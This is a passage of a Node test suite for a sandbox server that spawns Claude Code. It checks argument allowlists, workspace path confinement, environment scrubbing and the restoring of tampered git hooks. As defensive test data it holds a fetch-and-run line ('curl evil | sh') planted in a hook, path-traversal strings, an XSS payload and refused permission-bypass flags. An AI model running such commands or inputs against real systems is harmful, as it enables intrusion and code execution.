// bn-coded (terminal/bin/bn-coded.mjs), the sandbox's spawn server: its argument allowlists, path confinement,
// environment, and every op over a real UNIX socket with a scratch workspace and a stand-in claude.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import net from 'node:net';
import { execFileSync } from 'node:child_process';
import { tmp, talk, open, result, stdout, TERMINAL_DIR } from './helpers.mjs';
import { frame, T } from '../server/frames.mjs';

const ROOT = tmp('bncd');
const WS = path.join(ROOT, 'ws'), HOME = path.join(ROOT, 'home'), SOCKDIR = path.join(ROOT, 'sock');
fs.mkdirSync(WS); fs.mkdirSync(HOME); fs.mkdirSync(path.join(ROOT, 'outside'));
fs.writeFileSync(path.join(ROOT, 'outside', 'secret.txt'), 'outside');
// a stand-in for Claude Code: says its arguments, cwd and some environment, echoes stdin, exits 3 at stdin's end
const FAKE = path.join(ROOT, 'claude');
fs.writeFileSync(FAKE, `#!/usr/bin/env node
const pick = ['ANTHROPIC_CUSTOM_HEADERS', 'SHARED_MCP_TOKEN', 'CLAUDE_CODE_ENTRYPOINT', 'EVIL', 'BN_CODE', 'PATH'];
const env = Object.fromEntries(pick.filter((k) => k in process.env).map((k) => [k, k === 'PATH' ? 'set' : process.env[k]]));
process.stdout.write(JSON.stringify({ args: process.argv.slice(2), cwd: process.cwd(), env }) + '\\n');
process.on('SIGTERM', () => { process.stdout.write('got SIGTERM\\n'); process.exit(143); });
process.stdin.on('data', (d) => process.stdout.write('echo:' + d));
process.stdin.on('end', () => process.exit(3));
`, { mode: 0o755 });
Object.assign(process.env, { BN_CODE_WORKSPACE: WS, BN_CODE_SOCK_DIR: SOCKDIR, BN_CODE_CHILDREN: path.join(ROOT, 'children'),
  BN_CLAUDE_BIN: FAKE, CLAUDE_CONFIG_DIR: path.join(HOME, '.claude'), HOME, SHARED_MCP_TOKEN: 'mcp-secret-token' });
const coded = await import(path.join(TERMINAL_DIR, 'bin/bn-coded.mjs'));
let server;
const SOCK = path.join(SOCKDIR, 'coded.sock');

before(async () => {
  server = coded.start();
  await new Promise((r) => (server.listening ? r() : server.once('listening', r)));
});
after(() => { server.close(); fs.rmSync(ROOT, { recursive: true, force: true }); });

const FIXED = ['--output-format', 'stream-json', '--verbose', '--input-format', 'stream-json'];
const SID = '3f2a1b4c-5d6e-4f70-8192-a3b4c5d6e7f8';

test('claude arguments: the SDK prefix, then only allowlisted --name=value / flags', () => {
  const ok = ['--model=claude-haiku-5-5', '--model=us.anthropic.claude-sonnet-5-5[1m]', '--fallback-model=haiku', '--permission-prompt-tool=stdio',
    '--permission-mode=default', '--permission-mode=acceptEdits', '--permission-mode=plan', '--permission-mode=dontAsk',
    '--setting-sources=user,project,local', '--setting-sources=', `--session-id=${SID}`, `--resume=${SID}`, `--resume-session-at=${SID}`,
    '--thinking=adaptive', '--effort=xhigh', '--max-turns=12', '--max-budget-usd=1.5', '--allowedTools=Bash(npm test:*)',
    '--disallowedTools=WebFetch', '--include-partial-messages', '--fork-session', '--include-hook-events',
    '--allow-dangerously-skip-permissions'];   // (CODE_ALLOW_BYPASS: the page may switch a session to Bypass permissions)
  assert.equal(coded.checkClaudeArgs([...FIXED, ...ok]), null);
  const refused = ['--settings={"x":1}', '--mcp-config=/tmp/x.json', '--plugin-dir=/tmp', '--debug-file=/tmp/d', '--betas=x',
    '--task-budget=10', '--managed-settings=x', '--add-dir=/', '--dangerously-skip-permissions', '--allow-dangerously-skip-permissions=1',
    '--permission-mode=bypassPermissions', '--permission-mode=auto', '--permission-mode=readOnly', '--permission-mode=manual', '--model', '--model=', '--model=-x', '--model=a b',
    '--model=x\ny', '--model=ü', `--session-id=${SID.toUpperCase()}`, '--resume=../../etc', '--setting-sources=user,policy',
    '--max-turns=0', '--max-turns=10000', '--max-budget-usd=-1', '--allowedTools=a\nb', '--include-partial-messages=1',
    '-p', 'positional', '--permission-prompt-tool=mcp__x', '--effort=ultra', '--thinking=enabled'];
  for (const a of refused) assert.notEqual(coded.checkClaudeArgs([...FIXED, a]), null, a);
  assert.notEqual(coded.checkClaudeArgs(FIXED.slice(1)), null, 'prefix');
  assert.notEqual(coded.checkClaudeArgs(['--verbose', ...FIXED]), null, 'prefix moved');
  assert.notEqual(coded.checkClaudeArgs([...FIXED, ...Array(60).fill('--fork-session')]), null, '65 arguments');
  assert.notEqual(coded.checkClaudeArgs([...FIXED, 42]), null, 'a number');
  assert.notEqual(coded.checkClaudeArgs('--model=x'), null, 'not a list');
});

test('cli: the plugin / marketplace / mcp shapes only, never -y', () => {
  fs.mkdirSync(path.join(WS, 'mkt', '.claude-plugin'), { recursive: true });
  fs.symlinkSync(path.join(ROOT, 'outside'), path.join(WS, 'mkt-out'));
  const stdio = JSON.stringify({ type: 'stdio', command: 'npx', args: ['-y', 'some-mcp@1.2.3'], env: { API_KEY: 'k' } });
  const http = JSON.stringify({ type: 'http', url: 'https://mcp.example.com/mcp', headers: { Authorization: 'Bearer x' } });
  const ok = [['plugin', 'list', '--json'], ['plugin', 'list', '--json', '--available'], ['plugin', 'marketplace', 'list', '--json'],
    ['plugin', 'install', 'commit-commands@claude-code-plugins', '--json', '--scope=user'],
    ['plugin', 'install', 'x', `--accept-command=${'a'.repeat(64)}`], ['plugin', 'uninstall', 'x', '--json'], ['plugin', 'enable', 'x', '--scope=local'],
    ['plugin', 'disable', 'x@m', '--json'], ['plugin', 'update', 'x@m', '--json', `--accept-command=${'b'.repeat(64)}`],
    ['plugin', 'marketplace', 'add', 'anthropics/claude-code', '--json'], ['plugin', 'marketplace', 'add', 'https://example.com/m.git'],
    ['plugin', 'marketplace', 'add', `${WS}/mkt`, '--json'], ['plugin', 'marketplace', 'update', 'm', '--json'],
    ['plugin', 'marketplace', 'remove', 'm', '--json'], ['mcp', 'list'], ['mcp', 'get', 'bedrock-shared'],
    ['mcp', 'add-json', 'my-server', stdio, '--scope=user'], ['mcp', 'add-json', 'remote_1', http, '--scope=user'],
    ['mcp', 'add-json', 'sse', JSON.stringify({ type: 'sse', url: 'http://10.0.0.5:9000/sse' }), '--scope=user'],
    ['mcp', 'remove', 'my-server', '--scope=user']];
  for (const a of ok) assert.equal(coded.checkCliArgs(a), null, a.join(' '));
  const refused = [['plugin', 'install', 'x', '-y'], ['plugin', 'install', 'x', '--yes'], ['plugin', 'install', 'x', '--config', 'k=v'],
    ['plugin', 'install', '../x'], ['plugin', 'install', 'x', 'y'], ['plugin', 'install'], ['plugin', 'list', 'x'],
    ['plugin', 'marketplace', 'add', 'file:///etc'], ['plugin', 'marketplace', 'add', '/workspace/m'], ['plugin', 'marketplace', 'add', 'http://x/y'],
    ['plugin', 'marketplace', 'add', `${WS}/missing`], ['plugin', 'marketplace', 'add', `${WS}/../outside`], ['plugin', 'marketplace', 'add', `${WS}/mkt-out`],
    ['plugin', 'marketplace', 'add', WS], ['plugin', 'marketplace', 'add', `${WS}/mkt\nx`], ['plugin', 'marketplace', 'add', 'mkt'],
    ['plugin', 'uninstall', 'x', '--prune'], ['plugin', 'uninstall', 'x', '-y'], ['plugin', 'disable', '--all'], ['plugin', 'install', 'x', '--json', '--json'],
    ['mcp', 'add', 'x', 'cmd'], ['config', 'set'], ['--settings', 'x'], ['plugin', 'install', 'x', '--scope=managed'],
    ['plugin', 'install', 'x', `--accept-command=${'A'.repeat(64)}`], ['plugin'], [], 'plugin list', ['plugin', 'list', 7],
    // MCP: user scope only, one fixed shape, never the stack's own server
    ['mcp', 'add-json', 'my-server', stdio], ['mcp', 'add-json', 'my-server', stdio, '--scope=project'], ['mcp', 'add-json', 'my-server', stdio, '--scope=local'],
    ['mcp', 'add-json', 'bedrock-shared', stdio, '--scope=user'], ['mcp', 'add-json', '-x', stdio, '--scope=user'], ['mcp', 'add-json', 'a b', stdio, '--scope=user'],
    ['mcp', 'add-json', 'x', '{"type":"stdio"}', '--scope=user'], ['mcp', 'add-json', 'x', '{"type":"ws","url":"wss://x/y"}', '--scope=user'],
    ['mcp', 'add-json', 'x', JSON.stringify({ type: 'stdio', command: 'a\nb' }), '--scope=user'],
    ['mcp', 'add-json', 'x', JSON.stringify({ type: 'stdio', command: 'a', oauth: {} }), '--scope=user'],
    ['mcp', 'add-json', 'x', JSON.stringify({ type: 'stdio', command: 'a', env: { 'A-B': 'x' } }), '--scope=user'],
    ['mcp', 'add-json', 'x', JSON.stringify({ type: 'http', url: 'file:///etc/passwd' }), '--scope=user'],
    ['mcp', 'add-json', 'x', JSON.stringify({ type: 'http', url: 'https://x/y', headers: { 'X-A': 'a\r\nb' } }), '--scope=user'],
    ['mcp', 'add-json', 'x', 'not json', '--scope=user'], ['mcp', 'add-json', 'x', '[1]', '--scope=user'],
    ['mcp', 'remove', 'bedrock-shared', '--scope=user'], ['mcp', 'remove', 'x'], ['mcp', 'add-from-claude-desktop'], ['mcp', 'serve']];
  for (const a of refused) assert.notEqual(coded.checkCliArgs(a), null, JSON.stringify(a));
});

test('cli environment: no Claude Code session markers (the CLI ignores --accept-command inside a session)', () => {
  const env = coded.cliEnv({ PATH: '/bin', CLAUDECODE: '1', CLAUDE_CODE_ENTRYPOINT: 'cli', CLAUDE_CODE_SESSION_ID: 'x', CLAUDE_CODE_MESSAGING_SOCKET: '/s',
    CLAUDE_PID: '1', AI_AGENT: 'x', CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: '1', SHARED_MCP_TOKEN: 't', ANTHROPIC_CUSTOM_HEADERS: 'x' });
  assert.deepEqual(env, { PATH: '/bin', CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: '1' });
});

test('environment: the container\'s, minus the MCP token and its own variables; the SDK\'s few; the LiteLLM tag from a UUID', () => {
  const env = coded.childEnv({ CLAUDE_CODE_ENTRYPOINT: 'sdk-ts', EVIL: 'x', CLAUDE_AGENT_SDK_VERSION: 'a\nb', LD_PRELOAD: '/x' }, SID,
    { PATH: '/bin', SHARED_MCP_TOKEN: 't', BN_CODE: '1', BN_CODE_SOCK_DIR: '/x', ANTHROPIC_AUTH_TOKEN: 'k' });
  assert.deepEqual(env, { PATH: '/bin', ANTHROPIC_AUTH_TOKEN: 'k', CLAUDE_CODE_ENTRYPOINT: 'sdk-ts',
    ANTHROPIC_CUSTOM_HEADERS: `x-litellm-session-id: code-${SID}\nx-litellm-tags: claude-bedrock,code` });
  assert.equal(coded.childEnv({}, '../../etc', { ANTHROPIC_CUSTOM_HEADERS: 'x' }).ANTHROPIC_CUSTOM_HEADERS, undefined);
});

test('paths: confined to the workspace, symlinks resolved in its own view', () => {
  fs.mkdirSync(path.join(WS, 'd'), { recursive: true });
  fs.writeFileSync(path.join(WS, 'd', 'a.txt'), 'a');
  fs.symlinkSync(path.join(ROOT, 'outside'), path.join(WS, 'out'));
  fs.symlinkSync(path.join(WS, 'd'), path.join(WS, 'in'));
  assert.equal(coded.confine(''), WS);
  assert.equal(coded.confine('/'), WS);
  assert.equal(coded.confine('d/a.txt'), path.join(WS, 'd', 'a.txt'));
  assert.equal(coded.confine(`${WS}/d`), path.join(WS, 'd'));
  assert.equal(coded.confine('in/a.txt'), path.join(WS, 'd', 'a.txt'));
  for (const p of ['../outside/secret.txt', '../../etc/passwd', 'out/secret.txt', 'out', '/etc/passwd', 'd/../../outside', `x\0y`, 7, null, 'x'.repeat(5000)]) {
    assert.equal(coded.confine(p), null, String(p).slice(0, 40));
  }
  assert.equal(coded.confine('d/new.txt', { mustExist: false }), path.join(WS, 'd', 'new.txt'));
  assert.equal(coded.confine('out/new.txt', { mustExist: false }), null);
  assert.equal(coded.confine('nodir/new.txt', { mustExist: false }), null);
  assert.equal(coded.confine('..', { mustExist: false }), null);
});

test('fs ops over the socket: list, read, write (precondition, unique names), mkdir, rename, delete into the trash', async () => {
  fs.mkdirSync(path.join(WS, 'f'));
  let r = result(await talk(SOCK, [open({ op: 'fs.write', path: 'f/hello.txt', size: 5, mode: 'create' }), frame(T.STDIN, Buffer.from('hel')), frame(T.STDIN, Buffer.from('lo')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.equal(r.path, 'f/hello.txt'); assert.equal(r.size, 5);
  assert.equal(fs.readFileSync(path.join(WS, 'f/hello.txt'), 'utf8'), 'hello');
  const mtime = r.mtimeMs;
  r = result(await talk(SOCK, [open({ op: 'fs.write', path: 'f/hello.txt', size: 2, mode: 'create' }), frame(T.STDIN, Buffer.from('hi')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.match(r.error, /exists already/);
  r = result(await talk(SOCK, [open({ op: 'fs.write', path: 'f/hello.txt', size: 2, mode: 'unique' }), frame(T.STDIN, Buffer.from('hi')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.equal(r.path, 'f/hello-1.txt');
  r = result(await talk(SOCK, [open({ op: 'fs.write', path: 'f/hello.txt', size: 2, ifMtimeMs: mtime - 1000 }), frame(T.STDIN, Buffer.from('xx')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.match(r.error, /changed on disk/);
  r = result(await talk(SOCK, [open({ op: 'fs.write', path: 'f/hello.txt', size: 3, ifMtimeMs: mtime }), frame(T.STDIN, Buffer.from('new')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.equal(r.size, 3);
  // more or fewer bytes than announced: refused, nothing left behind
  r = result(await talk(SOCK, [open({ op: 'fs.write', path: 'f/x.txt', size: 1 }), frame(T.STDIN, Buffer.from('xx')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.match(r.error, /more bytes/);
  r = result(await talk(SOCK, [open({ op: 'fs.write', path: 'f/x.txt', size: 9 }), frame(T.STDIN, Buffer.from('xx')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.match(r.error, /fewer bytes/);
  assert.deepEqual(fs.readdirSync(path.join(WS, 'f')).sort(), ['hello-1.txt', 'hello.txt']);
  r = result(await talk(SOCK, [open({ op: 'fs.list', path: 'f' })]));
  assert.deepEqual(r.entries.map((e) => [e.name, e.type]).sort(), [['hello-1.txt', 'file'], ['hello.txt', 'file']]);
  let frames = await talk(SOCK, [open({ op: 'fs.read', path: 'f/hello.txt', max: 2 })]);
  assert.equal(stdout(frames).toString(), 'ne'); assert.equal(result(frames).truncated, true); assert.equal(result(frames).size, 3);
  assert.equal(result(await talk(SOCK, [open({ op: 'fs.mkdir', path: 'f/sub' })])).path, 'f/sub');
  assert.equal(result(await talk(SOCK, [open({ op: 'fs.rename', from: 'f/hello-1.txt', to: 'f/sub/moved.txt' })])).path, 'f/sub/moved.txt');
  assert.match(result(await talk(SOCK, [open({ op: 'fs.rename', from: 'f/hello.txt', to: 'f/sub/moved.txt' })])).error, /exists already/);
  r = result(await talk(SOCK, [open({ op: 'fs.delete', path: 'f/sub' })]));
  assert.match(r.trash, /^\.bedrock-now-trash\/.+\/sub$/);
  assert.ok(fs.existsSync(path.join(WS, r.trash, 'moved.txt')));
  assert.equal(fs.readFileSync(path.join(WS, '.bedrock-now-trash', '.gitignore'), 'utf8'), '*\n', 'git leaves the trash alone');
  // a replaced file keeps its mode (a script stays executable); a new one gets the default
  fs.writeFileSync(path.join(WS, 'f/run.sh'), 'echo 1\n', { mode: 0o755 });
  fs.chmodSync(path.join(WS, 'f/run.sh'), 0o750);
  r = result(await talk(SOCK, [open({ op: 'fs.write', path: 'f/run.sh', size: 7 }), frame(T.STDIN, Buffer.from('echo 2\n')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.equal(r.size, 7);
  assert.equal(fs.statSync(path.join(WS, 'f/run.sh')).mode & 0o777, 0o750);
  assert.equal(fs.readFileSync(path.join(WS, 'f/run.sh'), 'utf8'), 'echo 2\n');
  // fs.find: the @-picker over the whole workspace — bounded, no links followed, .git / the trash / dependencies and
  // build output skipped
  fs.mkdirSync(path.join(WS, 'f/deep/er/node_modules/pkg'), { recursive: true });
  fs.writeFileSync(path.join(WS, 'f/deep/er/Target.md'), 'x');
  fs.writeFileSync(path.join(WS, 'f/deep/er/node_modules/pkg/target.js'), 'x');
  for (const d of ['.venv/lib', 'dist', 'build', 'target/debug', '__pycache__', '.next', '.cache']) {
    fs.mkdirSync(path.join(WS, 'f', d), { recursive: true });
    fs.writeFileSync(path.join(WS, 'f', d, 'target.txt'), 'x');
  }
  r = result(await talk(SOCK, [open({ op: 'fs.find', q: 'TARGET', limit: 10 })]));
  assert.deepEqual(r, { paths: ['f/deep/er/Target.md'], truncated: false });
  r = result(await talk(SOCK, [open({ op: 'fs.find', q: 'deep', limit: 2 })]));
  assert.deepEqual([r.paths, r.truncated], [['f/deep/', 'f/deep/er/'], true]);
  assert.ok(!result(await talk(SOCK, [open({ op: 'fs.find', q: 'secret' })])).paths.length, 'the link out is not followed');
  // your user memory: one fixed file (never a link), read and written whole
  r = result(await talk(SOCK, [open({ op: 'memory.read' })]));
  assert.deepEqual(r, { path: '~/.claude/CLAUDE.md', exists: false });
  r = result(await talk(SOCK, [open({ op: 'memory.write', size: 6 }), frame(T.STDIN, Buffer.from('# me\n\n')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.equal(r.path, '~/.claude/CLAUDE.md');
  assert.equal(fs.readFileSync(path.join(HOME, '.claude/CLAUDE.md'), 'utf8'), '# me\n\n');
  const frames2 = await talk(SOCK, [open({ op: 'memory.read' })]);
  assert.equal(stdout(frames2).toString(), '# me\n\n');
  assert.equal(result(frames2).exists, true);
  fs.rmSync(path.join(HOME, '.claude/CLAUDE.md'));
  fs.symlinkSync(path.join(ROOT, 'outside', 'secret.txt'), path.join(HOME, '.claude/CLAUDE.md'));
  assert.ok(result(await talk(SOCK, [open({ op: 'memory.read' })])).error, 'a link is refused');
  assert.ok(result(await talk(SOCK, [open({ op: 'memory.write', size: 1 }), frame(T.STDIN, Buffer.from('x')), frame(T.STDIN_END, Buffer.alloc(0))])).error);
  assert.equal(fs.readFileSync(path.join(ROOT, 'outside', 'secret.txt'), 'utf8'), 'outside');
  fs.rmSync(path.join(HOME, '.claude/CLAUDE.md'));
  for (const req of [{ op: 'fs.delete', path: '' }, { op: 'fs.delete', path: '.bedrock-now-trash' }, { op: 'fs.read', path: '../outside/secret.txt' },
    { op: 'fs.read', path: 'out/secret.txt' }, { op: 'fs.list', path: '/etc' }, { op: 'fs.write', path: 'out/x', size: 0 }, { op: 'fs.mkdir', path: '../x' },
    { op: 'fs.rename', from: 'f/hello.txt', to: '../outside/stolen' }, { op: 'fs.read', path: 'f' }, { op: 'exec', cmd: 'id' }, { op: 'fs.write', path: 'f/y', size: 26 << 20 }]) {
    assert.ok(result(await talk(SOCK, [open(req)])).error, JSON.stringify(req));
  }
  assert.ok(!fs.existsSync(path.join(ROOT, 'outside', 'stolen')));
  // missing inside the workspace: ENOENT (the page says "not found"); outside: refused
  assert.equal(result(await talk(SOCK, [open({ op: 'fs.read', path: 'f/nope.txt' })])).error, 'ENOENT');
  assert.equal(result(await talk(SOCK, [open({ op: 'fs.list', path: 'nodir' })])).error, 'ENOENT');
  assert.equal(result(await talk(SOCK, [open({ op: 'fs.read', path: '../outside/nope' })])).error, 'not in the workspace');
});

test('fs.read: a FIFO cannot hang it, a device is not a file, a big file is cut', async (t) => {
  const fifo = path.join(WS, 'fifo');
  try { execFileSync('mkfifo', [fifo]); } catch { t.skip('no mkfifo'); return; }
  assert.match(result(await talk(SOCK, [open({ op: 'fs.read', path: 'fifo' })], { timeoutMs: 5000 })).error, /not a file/);
  fs.symlinkSync('/dev/zero', path.join(WS, 'zero'));
  assert.ok(result(await talk(SOCK, [open({ op: 'fs.read', path: 'zero' })], { timeoutMs: 5000 })).error);   // outside, or not a file
  fs.writeFileSync(path.join(WS, 'big.bin'), Buffer.alloc(3 << 20, 1));
  const frames = await talk(SOCK, [open({ op: 'fs.read', path: 'big.bin', max: 2 << 20 })]);
  assert.equal(stdout(frames).length, 2 << 20); assert.equal(result(frames).truncated, true);
});

test('frames: open first, a frame over 4 MiB ends the connection, garbage is refused', async () => {
  assert.match(result(await talk(SOCK, [frame(T.STDIN, Buffer.from('x'))])).error, /open first/);
  assert.match(result(await talk(SOCK, [Buffer.from([1, 0xff, 0xff, 0xff, 0xff])])).error, /frame too large/);
  assert.match(result(await talk(SOCK, [frame(T.OPEN, Buffer.from('{not json'))])).error, /bad open/);
  assert.match(result(await talk(SOCK, [frame(T.OPEN, Buffer.from('[1]'))])).error, /bad open|unknown op/);
});

test('sessions: list (titles, prompts, no symlinks, bad names skipped), load, title', async () => {
  const dir = path.join(HOME, '.claude', 'projects', WS.replace(/[^A-Za-z0-9]/g, '-'));
  fs.mkdirSync(dir, { recursive: true });
  const lines = [
    { type: 'user', message: { role: 'user', content: 'first <img src=x onerror=alert(1)>' }, timestamp: '2026-10-15T10:00:00Z', cwd: '/workspace', gitBranch: 'main', uuid: 'u1' },
    { type: 'assistant', message: { role: 'assistant', content: [{ type: 'text', text: 'hi' }] }, uuid: 'u2', parentUuid: 'u1' },
    { type: 'user', message: { role: 'user', content: [{ type: 'text', text: 'second' }] }, uuid: 'u3' },
  ];
  fs.writeFileSync(path.join(dir, `${SID}.jsonl`), `${lines.map((l) => JSON.stringify(l)).join('\n')}\n{partial`);
  fs.writeFileSync(path.join(dir, '../../etc.jsonl'.replace(/\//g, '_')), '{}');
  fs.symlinkSync(path.join(ROOT, 'outside', 'secret.txt'), path.join(dir, '00000000-0000-4000-8000-000000000000.jsonl'));
  let r = result(await talk(SOCK, [open({ op: 'sessions.list' })]));
  assert.equal(r.sessions.length, 1);
  assert.equal(r.sessions[0].id, SID);
  assert.equal(r.sessions[0].firstPrompt, 'first <img src=x onerror=alert(1)>');
  assert.equal(r.sessions[0].lastPrompt, 'second');
  assert.equal(r.sessions[0].gitBranch, 'main');
  r = result(await talk(SOCK, [open({ op: 'sessions.load', id: SID })]));
  assert.equal(r.entries.length, 3);
  assert.equal(result(await talk(SOCK, [open({ op: 'sessions.load', id: '../../etc' })])).error, 'bad session id');
  assert.equal(result(await talk(SOCK, [open({ op: 'sessions.load', id: '00000000-0000-4000-8000-000000000000' })])).entries, null);
  assert.equal(result(await talk(SOCK, [open({ op: 'sessions.title', id: SID, title: 'Renamed' })])).ok, true);
  assert.match(result(await talk(SOCK, [open({ op: 'sessions.title', id: SID, title: 'a\nb' })])).error, /bad title/);
  assert.equal(result(await talk(SOCK, [open({ op: 'sessions.list' })])).sessions[0].customTitle, 'Renamed');
});

test('claude: runs in the workspace with the checked arguments, the shared MCP config, its environment; stdin, signals, exit', async () => {
  fs.mkdirSync(path.join(HOME, '.config/bedrock-now'), { recursive: true });
  fs.writeFileSync(path.join(HOME, '.config/bedrock-now/mcp.json'), '{}');
  const c = net.connect(SOCK);
  const { FrameParser } = await import('../server/frames.mjs');
  const parser = new FrameParser();
  const got = [];
  const closed = new Promise((r) => c.on('close', r));
  c.on('data', (d) => got.push(...parser.push(d)));
  c.write(open({ op: 'claude', args: [...FIXED, '--model=haiku', `--session-id=${SID}`], cwd: '/ignored-outside', env: {}, litellmSession: SID }));
  await new Promise((r) => setTimeout(r, 300));
  assert.match(result(got).error || '', /cwd must be in/);
  await closed;

  const c2 = net.connect(SOCK);
  const p2 = new FrameParser();
  const got2 = [];
  const done = new Promise((r) => c2.on('close', r));
  c2.on('data', (d) => got2.push(...p2.push(d)));
  c2.write(open({ op: 'claude', args: [...FIXED, '--model=haiku', `--session-id=${SID}`], cwd: WS, env: { CLAUDE_CODE_ENTRYPOINT: 'sdk-ts', EVIL: '1' }, litellmSession: SID }));
  c2.write(frame(T.STDIN, Buffer.from('{"type":"user"}\n')));
  c2.write(frame(T.STDIN_END, Buffer.alloc(0)));
  await done;
  const out = stdout(got2).toString().split('\n');
  const info = JSON.parse(out[0]);
  assert.deepEqual(info.args, [...FIXED, `--mcp-config=${path.join(HOME, '.config/bedrock-now/mcp.json')}`, '--model=haiku', `--session-id=${SID}`]);
  assert.equal(info.cwd, WS);
  assert.deepEqual(info.env, { ANTHROPIC_CUSTOM_HEADERS: `x-litellm-session-id: code-${SID}\nx-litellm-tags: claude-bedrock,code`, CLAUDE_CODE_ENTRYPOINT: 'sdk-ts', PATH: 'set' });
  assert.equal(out[1], 'echo:{"type":"user"}');
  const exit = got2.find(([t]) => t === T.EXIT);
  assert.deepEqual(JSON.parse(exit[1]), { code: 3, signal: null });

  // SIGTERM through a SIGNAL frame
  const c3 = net.connect(SOCK);
  const p3 = new FrameParser(); const got3 = [];
  const done3 = new Promise((r) => c3.on('close', r));
  c3.on('data', (d) => got3.push(...p3.push(d)));
  c3.write(open({ op: 'claude', args: FIXED, cwd: WS }));
  await new Promise((r) => setTimeout(r, 400));
  c3.write(frame(T.SIGNAL, { signal: 'SIGTERM' }));
  await done3;
  assert.match(stdout(got3).toString(), /got SIGTERM/);
  assert.deepEqual(JSON.parse(got3.find(([t]) => t === T.EXIT)[1]), { code: 143, signal: null });
});

test('claude: the code side going away ends the process (stdin EOF)', async () => {
  const c = net.connect(SOCK);
  c.write(open({ op: 'claude', args: FIXED, cwd: WS }));
  await new Promise((r) => setTimeout(r, 400));
  const before = fs.readdirSync(path.join(ROOT, 'children'));
  assert.equal(before.length, 1, 'the child is recorded');
  c.destroy();
  for (let i = 0; i < 50 && fs.readdirSync(path.join(ROOT, 'children')).length; i++) await new Promise((r) => setTimeout(r, 100));
  assert.deepEqual(fs.readdirSync(path.join(ROOT, 'children')), [], 'the child exited and was forgotten');
});

test('orphans: a recorded child still running stream-json is ended at start; a reused PID is not', (t) => {
  if (!fs.existsSync('/proc/self/stat')) { t.skip('no /proc here'); return; }
  const dir = path.join(ROOT, 'children');
  fs.mkdirSync(dir, { recursive: true });
  const statStart = (pid) => fs.readFileSync(`/proc/${pid}/stat`, 'utf8').replace(/^.*\) /s, '').split(' ')[19];
  fs.writeFileSync(path.join(dir, String(process.pid)), statStart(process.pid));   // this test process: no stream-json
  fs.writeFileSync(path.join(dir, '999999'), '1');                                   // gone
  fs.writeFileSync(path.join(dir, String(process.ppid)), '12345');                   // a start time that does not match
  const killed = [];
  assert.deepEqual(coded.sweepOrphans({ kill: (pid, sig) => killed.push([pid, sig]) }), []);
  assert.deepEqual(killed, []);
  assert.deepEqual(fs.readdirSync(dir), []);
});

test('the watchlist (ws.sensitive / ws.restore): the watched files with hashes and copies, never through a link; put back only while unchanged', async () => {
  const w = (p, t, mode = 0o644) => { fs.mkdirSync(path.dirname(path.join(WS, p)), { recursive: true }); fs.writeFileSync(path.join(WS, p), t, { mode }); fs.chmodSync(path.join(WS, p), mode); };
  w('.git/config', '[core]\n'); w('.git/hooks/pre-commit.sample', 'sample'); w('.git/hooks/pre-push', 'echo push\n', 0o755);
  w('.husky/pre-commit', 'npx lint-staged\n'); fs.mkdirSync(path.join(WS, '.husky/_'), { recursive: true });
  w('package.json', '{"scripts":{"test":"x"}}'); w('.envrc', 'export A=1\n'); w('src/other.txt', 'not watched');
  fs.mkdirSync(path.join(WS, '.vscode'), { recursive: true });
  fs.symlinkSync(path.join(ROOT, 'outside', 'secret.txt'), path.join(WS, '.vscode', 'tasks.json'));   // a link: reported as one
  let r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  const by = Object.fromEntries(r.files.map((f) => [f.path, f]));
  assert.deepEqual(Object.keys(by).sort(), ['.envrc', '.git', '.git/config', '.git/hooks', '.git/hooks/pre-push', '.husky', '.husky/pre-commit', '.vscode/tasks.json', 'package.json']);
  assert.deepEqual([by['.git'].type, by['.git'].kind, by['.git/config'].kind, by['.git/hooks/pre-push'].kind, by['.husky/pre-commit'].kind], ['dir', 'git-dir', 'git-config', 'git-hook', 'husky']);
  assert.equal(Buffer.from(by['.git/hooks/pre-push'].data, 'base64').toString(), 'echo push\n');
  assert.equal(by['.git/hooks/pre-push'].mode & 0o777, 0o755);
  assert.match(by['.git/config'].sha256, /^[0-9a-f]{64}$/);
  assert.deepEqual([by['.vscode/tasks.json'].type, by['.vscode/tasks.json'].data, by['.vscode/tasks.json'].target], ['symlink', undefined, path.join(ROOT, 'outside', 'secret.txt')]);
  assert.equal(by['.git/hooks'].type, 'dir');
  // put back: a changed file (its old copy and mode), only while its hash is the one given
  const before = by['.git/hooks/pre-push'];
  w('.git/hooks/pre-push', 'curl evil | sh\n', 0o644);
  const now = result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).files.find((f) => f.path === '.git/hooks/pre-push');
  r = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.git/hooks/pre-push', ifSha256: before.sha256, data: before.data, mode: 0o755 })]));
  assert.match(r.error, /changed again/, 'refused: it is not as the turn end saw it');
  r = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.git/hooks/pre-push', ifSha256: now.sha256, data: before.data, mode: 0o755 })]));
  assert.equal(r.action, 'restored');
  assert.equal(fs.readFileSync(path.join(WS, '.git/hooks/pre-push'), 'utf8'), 'echo push\n');
  assert.equal(fs.statSync(path.join(WS, '.git/hooks/pre-push')).mode & 0o777, 0o755);
  // a file that was not there: into the workspace trash (a link moved as a link, never its target)
  w('.git/hooks/post-merge', 'x');
  const pm = result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).files.find((f) => f.path === '.git/hooks/post-merge');
  r = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.git/hooks/post-merge', ifSha256: pm.sha256, data: null })]));
  assert.equal(r.action, 'trashed');
  assert.equal(fs.existsSync(path.join(WS, '.git/hooks/post-merge')), false);
  assert.ok(fs.existsSync(path.join(WS, r.trash)));
  const link = by['.vscode/tasks.json'];
  r = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.vscode/tasks.json', ifSha256: link.sha256, data: null })]));
  assert.equal(r.action, 'trashed');
  assert.equal(fs.readFileSync(path.join(ROOT, 'outside', 'secret.txt'), 'utf8'), 'outside', 'the target is untouched');
